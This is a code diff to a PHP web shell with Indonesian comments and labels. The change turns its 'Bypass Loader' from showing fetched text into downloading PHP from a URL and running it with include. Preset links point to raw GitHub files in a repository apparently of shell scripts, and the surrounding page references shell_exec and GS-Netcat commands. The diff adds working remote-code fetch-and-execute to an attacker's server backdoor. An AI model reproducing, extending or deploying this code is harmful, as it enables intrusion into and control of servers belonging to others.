@@ -382,7 +382,7 @@ if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
         }
     }
 }
-// === BYPASS BUTTONS HANDLER ===
+// === BYPASS BUTTONS HANDLER (FIXED - EKSEKUSI SCRIPT) ===
 if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
     $url = trim($_POST['bypass_url']);
     if ($url !== '') {
@@ -400,7 +400,24 @@ if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
             if ($data === false) {
                 $bypass_output = "Gagal mengambil konten dari URL: " . htmlspecialchars($url);
             } else {
-                $bypass_output = $data;
+                // Simpan script ke file temporary
+                $temp_file = tempnam(sys_get_temp_dir(), 'bypass_');
+                file_put_contents($temp_file, $data);
+                
+                // Eksekusi script dan tangkap output
+                ob_start();
+                try {
+                    include $temp_file;
+                } catch (Exception $e) {
+                    echo "Error: " . $e->getMessage();
+                }
+                $execution_output = ob_get_clean();
+                
+                // Hapus file temporary
+                @unlink($temp_file);
+                
+                // Tampilkan hasil eksekusi
+                $bypass_output = $execution_output;
             }
         }
     }
@@ -2144,7 +2161,7 @@ if (function_exists('shell_exec')) {
     <?php elseif ($mode === 'bypass'): ?>
         <div class="card">
             <h3>Bypass Loader</h3>
-            <p style="color:#9fb7d8;">Klik salah satu tombol di bawah untuk mengambil konten dari URL terkait. Hanya ditampilkan sebagai teks (tidak dieksekusi).</p>
+            <p style="color:#9fb7d8;">Klik salah satu tombol di bawah untuk mengeksekusi script dari URL terkait. Hasil eksekusi akan ditampilkan di bawah.</p>
             <?php
                 $bypass_links = array(
                     '1' => 'https://raw.githubusercontent.com/kikyrestunoviansyah/shelkuku/refs/heads/main/1.php',
@@ -2163,10 +2180,8 @@ if (function_exists('shell_exec')) {
                 <?php endforeach; ?>
             </div>
             <div class="form-group">
-                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">Output</label>
-                <textarea readonly style="width:100%;min-height:260px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre;overflow:auto;">
-<?php echo htmlspecialchars($bypass_output); ?>
-                </textarea>
+                <label style="display:block;margin-bottom:6px;color:#a9c0e8;font-weight:600;">Hasil Eksekusi Script</label>
+                <textarea readonly style="width:100%;min-height:400px;background:#041022;color:#e6eef8;border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:12px;font-family:monospace;white-space:pre-wrap;overflow:auto;"><?php echo htmlspecialchars($bypass_output); ?></textarea>
             </div>
             <hr style="margin:25px 0;border:0;border-top:1px solid rgba(255,255,255,0.08);">
             <h3 style="margin:0 0 12px;">GS-Netcat Quick Commands</h3>
